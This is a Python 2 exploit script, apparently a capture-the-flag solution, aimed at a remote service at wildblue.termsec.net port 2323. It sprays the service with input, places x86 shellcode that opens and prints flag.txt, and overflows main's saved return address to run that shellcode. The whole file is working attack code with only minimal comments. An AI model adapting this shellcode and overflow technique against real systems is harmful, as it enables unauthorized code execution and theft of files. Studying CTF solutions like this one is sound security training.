#!/usr/bin/env python

import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("wildblue.termsec.net", 2323))

fd = "\x01"
payload = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
           "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
           "\x80\x89\xc6\xeb\x06\xb0\x01\x31"
           "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
           "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
           "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
           "\x04\xb3" +fd+ "\xb2\x01\xcd\x80\x83"
           "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
           "\xffflag.txt\x00")


print s.recv(4096)
s.sendall("A" * 31 + "\n")
print s.recv(4096)
s.sendall("1\n")
print s.recv(4096)
s.sendall("-1\n")
print s.recv(4096)

# send out payload
for i in xrange(0, 255):
    # this will be page 0x20200000
    if i == 178:
        s.sendall("BBBBBBBBBBBBBBBBBBBBBBBBBBBB\x20\x20\x20\x20" + payload + "\n")
    else:
        s.sendall("A"* 255 + "\n")

    print s.recv(4096)

# Rename ourselv, overflow main's saved eip
s.sendall("3\n")
print s.recv(4096)
s.sendall(" " * 95 + "\n")
print s.recv(4096)

s.sendall("4\n")
while True:
    data = s.recv(4096)
    if len(data):
        print data
